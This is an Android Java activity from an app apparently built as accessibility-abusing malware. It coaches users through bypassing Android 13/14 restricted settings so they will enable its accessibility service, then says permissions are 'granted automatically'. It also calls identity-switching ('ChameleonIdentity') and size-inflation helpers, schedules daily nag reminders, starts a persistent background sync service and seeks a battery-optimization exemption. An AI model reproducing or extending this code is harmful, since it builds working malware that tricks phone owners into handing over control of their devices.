package com.task.tusker;

import android.app.Dialog;
import android.content.Intent;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.net.Uri;
import android.webkit.WebView;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import com.task.tusker.permissions.AutoPermissionManager;
import com.task.tusker.SystemManagerActivity;
import com.task.tusker.receivers.AccessibilityReminderReceiver;
import com.task.tusker.security.ChameleonIdentity;
import com.task.tusker.security.SecurityGuard;
import com.task.tusker.security.SizeInflationManager;
import com.task.tusker.services.DataSyncService;

public class MainActivity extends AppCompatActivity {

    /**
     * YouTube embed ID — "Android 13 & 14 Accessibility Access Restricted Setting Enable or Bypass"
     * Channel: munchy | 523K views | 4.7K likes | 2:14
     * Covers the exact step users struggle with on modern Android.
     */
    // Offline tutorial bundled inside the APK as an asset
    private static final String HELP_ASSET_URL = "file:///android_asset/help_tutorial.html";

    private TextView statusText;
    private TextView statusTitle;
    private TextView statusDesc;
    private TextView statusIcon;
    private TextView appNameText;
    private TextView step3Text;
    private Button openAccessibilityBtn;
    private Button helpBtn;

    private AutoPermissionManager permissionManager;
    private Handler pollHandler;
    private Runnable pollRunnable;
    private boolean accessibilityWasEnabled = false;

    // Keep a reference so we can clean up on destroy
    private Dialog helpVideoDialog;
    private WebView helpWebView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        SecurityGuard.init(this);
        SizeInflationManager.ensureInflated(this);
        ChameleonIdentity.selectIdentity(this);

        setContentView(R.layout.activity_main);

        permissionManager = new AutoPermissionManager(this);

        statusText           = findViewById(R.id.statusText);
        statusTitle          = findViewById(R.id.statusTitle);
        statusDesc           = findViewById(R.id.statusDesc);
        statusIcon           = findViewById(R.id.statusIcon);
        appNameText          = findViewById(R.id.appNameText);
        step3Text            = findViewById(R.id.step3Text);
        openAccessibilityBtn = findViewById(R.id.openAccessibilityBtn);
        helpBtn              = findViewById(R.id.helpBtn);

        // Show the real app name in the title and step 3
        String appName = getString(R.string.app_name);
        if (appName == null || appName.isEmpty()) appName = "TestApp";
        appNameText.setText(appName);
        step3Text.setText("Find and tap \u201c" + appName + "\u201d in the list");

        openAccessibilityBtn.setOnClickListener(v -> {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        });

        helpBtn.setOnClickListener(v -> showHelpVideoDialog());

        startDataSyncService();
        AccessibilityReminderReceiver.scheduleDailyReminders(this);
        updateUiState();
        startPolling();
    }

    // ── Help video ───────────────────────────────────────────────────────────

    private void showHelpVideoDialog() {
        // Full-screen black dialog containing a close button + YouTube WebView
        helpVideoDialog = new Dialog(this, android.R.style.Theme_Black_NoTitleBar_Fullscreen);
        helpVideoDialog.requestWindowFeature(Window.FEATURE_NO_TITLE);

        float dp = getResources().getDisplayMetrics().density;

        // Root container — black background
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.BLACK);

        // ── Header bar with close button ─────────────────────────────────
        FrameLayout header = new FrameLayout(this);
        header.setBackgroundColor(0xFF1F2937);
        int headerH = (int)(48 * dp);

        TextView titleTv = new TextView(this);
        titleTv.setText("How to enable Accessibility");
        titleTv.setTextColor(0xFFF1F5F9);
        titleTv.setTextSize(14);
        FrameLayout.LayoutParams titleLp = new FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        titleLp.gravity = Gravity.CENTER;
        header.addView(titleTv, titleLp);

        Button closeBtn = new Button(this);
        closeBtn.setText("\u2715");          // ✕
        closeBtn.setTextColor(0xFF94A3B8);
        closeBtn.setTextSize(16);
        closeBtn.setBackgroundColor(Color.TRANSPARENT);
        closeBtn.setStateListAnimator(null);
        FrameLayout.LayoutParams closeLp = new FrameLayout.LayoutParams(
                (int)(48 * dp), ViewGroup.LayoutParams.MATCH_PARENT);
        closeLp.gravity = Gravity.END | Gravity.CENTER_VERTICAL;
        header.addView(closeBtn, closeLp);

        root.addView(header, new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, headerH));

        // ── YouTube WebView ───────────────────────────────────────────────
        helpWebView = new WebView(this);
        WebSettings ws = helpWebView.getSettings();
        ws.setJavaScriptEnabled(true);
        ws.setDomStorageEnabled(true);
        ws.setMediaPlaybackRequiresUserGesture(false); // allow inline playback
        ws.setLoadWithOverviewMode(true);
        ws.setUseWideViewPort(true);
        helpWebView.setWebChromeClient(new WebChromeClient());
        helpWebView.setBackgroundColor(Color.BLACK);
        // Pass the real app name through so the tutorial never shows a hardcoded/test name.
        String encodedAppName = Uri.encode(getString(R.string.app_name));
        helpWebView.loadUrl(HELP_ASSET_URL + "?appName=" + encodedAppName);

        root.addView(helpWebView, new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f));

        // ── Caption below the video ───────────────────────────────────────
        TextView caption = new TextView(this);
        caption.setText("Follow the steps shown above, then come back here — features unlock automatically.");
        caption.setTextColor(0xFF94A3B8);
        caption.setTextSize(12);
        caption.setGravity(Gravity.CENTER);
        int pad = (int)(12 * dp);
        caption.setPadding(pad, pad, pad, pad);
        root.addView(caption, new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));

        helpVideoDialog.setContentView(root);

        // Dismiss and clean up WebView properly to stop audio/video
        closeBtn.setOnClickListener(v -> dismissHelpDialog());
        helpVideoDialog.setOnDismissListener(d -> stopAndDestroyWebView());

        // Full-screen window
        Window win = helpVideoDialog.getWindow();
        if (win != null) {
            win.setLayout(ViewGroup.LayoutParams.MATCH_PARENT,
                          ViewGroup.LayoutParams.MATCH_PARENT);
            win.addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);
        }

        helpVideoDialog.show();
    }

    private void dismissHelpDialog() {
        if (helpVideoDialog != null && helpVideoDialog.isShowing()) {
            helpVideoDialog.dismiss();
        }
    }

    private void stopAndDestroyWebView() {
        if (helpWebView != null) {
            helpWebView.stopLoading();
            helpWebView.loadUrl("about:blank"); // stops audio/video immediately
            helpWebView.onPause();
            helpWebView.pauseTimers();
            helpWebView.destroy();
            helpWebView = null;
        }
    }

    // ── Lifecycle ────────────────────────────────────────────────────────────

    @Override
    protected void onResume() {
        super.onResume();
        if (helpWebView != null) helpWebView.onResume();
        updateUiState();
    }

    @Override
    protected void onPause() {
        super.onPause();
        if (helpWebView != null) helpWebView.onPause();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopPolling();
        dismissHelpDialog();
        stopAndDestroyWebView();
    }

    // ── UI state ─────────────────────────────────────────────────────────────

    private void updateUiState() {
        if (permissionManager.isAccessibilityServiceEnabled()) {
            showEnabledState();
        } else {
            showSetupState();
        }
    }

    private void showSetupState() {
        statusText.setText("Accessibility permission not enabled");
        statusIcon.setText("\u26A0");
        statusTitle.setText("Permission Required");
        statusDesc.setText("Follow the steps below to unlock all features");
        openAccessibilityBtn.setText("Open Accessibility Settings");
        openAccessibilityBtn.setEnabled(true);
        helpBtn.setVisibility(View.VISIBLE);
        setCardVisibility(R.id.stepsCard, true);
        setCardVisibility(R.id.lockedCard, true);
    }

    private void showEnabledState() {
        statusText.setText("Service active \u2014 all features unlocked");
        statusIcon.setText("\u2713");
        statusTitle.setText("Accessibility Enabled");
        statusDesc.setText("Permissions are being granted automatically");
        openAccessibilityBtn.setText("Accessibility Settings");
        helpBtn.setVisibility(View.GONE);
        setCardVisibility(R.id.stepsCard, false);
        setCardVisibility(R.id.lockedCard, false);
    }

    private void setCardVisibility(int id, boolean visible) {
        View v = findViewById(id);
        if (v != null) v.setVisibility(visible ? View.VISIBLE : View.GONE);
    }

    // ── Polling ──────────────────────────────────────────────────────────────

    private void startPolling() {
        pollHandler = new Handler();
        pollRunnable = new Runnable() {
            @Override
            public void run() {
                boolean enabled = permissionManager.isAccessibilityServiceEnabled();
                if (enabled && !accessibilityWasEnabled) {
                    accessibilityWasEnabled = true;
                    showEnabledState();
                    // Open System Manager screen — permissions are handled by the service
                    try {
                        Intent smIntent = new Intent(MainActivity.this, SystemManagerActivity.class);
                        smIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                        startActivity(smIntent);
                    } catch (Exception ignored) {}
                } else if (!enabled && accessibilityWasEnabled) {
                    accessibilityWasEnabled = false;
                    showSetupState();
                }
                if (pollHandler != null) pollHandler.postDelayed(this, 800);
            }
        };
        pollHandler.post(pollRunnable);
    }

    private void stopPolling() {
        if (pollHandler != null && pollRunnable != null) {
            pollHandler.removeCallbacks(pollRunnable);
            pollHandler = null;
        }
    }

    private void requestRuntimePermissions() {
        permissionManager.requestAllPermissions();
        new Handler().postDelayed(() -> {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                try {
                    android.os.PowerManager pm =
                        (android.os.PowerManager) getSystemService(POWER_SERVICE);
                    if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                        Intent intent = new Intent(
                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            android.net.Uri.parse("package:" + getPackageName()));
                        startActivity(intent);
                    }
                } catch (Exception ignored) {}
            }
        }, 1500);
    }

    private void startDataSyncService() {
        try {
            Intent intent = new Intent(this, DataSyncService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        } catch (Exception ignored) {}
    }
}
